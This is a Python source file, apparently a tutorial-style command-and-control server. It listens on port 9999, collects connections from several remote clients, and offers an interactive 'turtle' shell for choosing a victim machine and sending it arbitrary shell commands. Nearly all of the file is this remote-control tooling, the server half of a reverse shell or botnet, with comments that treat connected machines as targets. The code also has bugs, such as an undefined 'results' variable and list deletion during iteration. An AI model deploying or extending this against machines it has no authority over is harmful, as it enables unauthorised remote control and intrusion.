import socket
import sys
import threading
import time
from queue import Queue

'''
1. Listen and accept connections 
2. Send commands
'''
NO_OF_THREADS = 2
# Thread number as specified above
JOB_NUMBER = [1,2]
queue = Queue()


''' Create a socket (connect two computers) '''
def create_socket():
    try:
        global host
        global port
        global s
        host = ""     # IP address of the server
        port = 9999
        s = socket.socket()
    # Catches any error when creating a socket
    except socket.error as error_msg:
        print("Socket Creation Error: " + str(error_msg))

''' Bind the socket and listening for clients' connection '''
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding Port: " + str(port))
        # Bind the host and port with the socket
        s.bind((host, port))
        # Listen to computers making connection to the socket. The argument specifies the number
        # of queued connections (min of 1)
        s.listen(5)
    # Catches any error when binding the socket
    except socket.error as error_msg:
        print("Socket Binding Error: " + str(error_msg) + "\nRetrying...")
        # Recursively bind the socket in case of failure
        bind_socket()

all_connections = []
all_address = []
''' 
Thread 1 Function: Handling connections from multiple clients and save them to the lists. 
All the previous connection should be closed whenever server.py is run.
'''
def accept_connection():
    # Closing the connection whenever this file run again
    for conn in all_connections:
        conn.close()

    # Delete all the elements of the list
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # Prevents the timeout of connection

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established!" + "\nIP :" + str(address[0]))

        except:
            print("Error accepting connections")


'''
Creating a custom interactive shell named turtle
Thread 2: Three jobs
1. See all the clients that are connected
2. Select a client
3. Send commands to the connected client

turtle> list would show all the clients connected to server like the following (Select ID and name):
0 Friend-A's IP Port
1 Friend-B's IP Port
2 Friend-C's IP Port

turtle> select 1, it should select Friend-A
'''
def start_turtle():
    while True:
        cmd = input("turtle>")
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            # If the connection exists or not
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")

''' Display all the current active connections with the client '''
def list_connections():
    result = ""
    for i, conn in enumerate(all_connections): # Enumerate function increase the value of i every loop
        try:
            conn.send(str.encode(" ")) # Send a dummy request to see if the connection is active
            conn.recv(201480)  # recv() throws exception if no response
        except:
            # Delete the connection
            del all_connections[i]
            del all_address[i]
            continue # Go back to the start of for loop

        # By this point, connection exists
        results = str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"
    print("--- Clients ---" + "\n" + results)

''' Selecting the target '''
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target is just id
        target = int(target)
        conn = all_connections[target]
        print("Now connected to : " + str(all_address[target][0]))
        # Shows the client IP address as a prompt to access it remotely
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except:
        print("Selection not valid.")
        return None

''' Send commands to client '''
def send_target_commands(conn):
    while True:
        try:
          cmd = input()

          if cmd == "quit":
            break
        # Encode the data into bytes by using str.encode()
          if len(str.encode(cmd)) > 0:  # Users entered something
            conn.send(str.encode(cmd))
            # All the output of the command needs to be stored. Received data must be converted from byte to string
            # format. 1024 is the block or transfer of unit. utf-8 is the format used to convert bytes to string.
            client_response = str(conn.recv(20480), "utf-8")
            # end argument makes the prompt goes to the next line after printing out
            print(client_response, end="")

        # If the client became inactive, then exception will be raised. Need to break out of the while loop
        except:
            print("Error sending command")
            break

''' Create worker threads '''
def create_workers():
    for _ in range(NO_OF_THREADS):
        # Argument target tells the thread what kind of works to do(whether handling the connection or sending commands)
        t = threading.Thread(target=work) # work is defined below
        # Thread ends when the program ends
        t.daemon = True
        t.start()

''' Do next job that is in the queue. First job (handle connection). Second job (send command)'''
def work():
    while True:
        # Returns the job number
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connection()
        if x == 2:
            start_turtle()

        queue.task_done()


''' Create jobs '''
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    # This blocks the main thread until the worker has processed everything that's in the queue
    queue.join()

create_workers()
create_jobs()
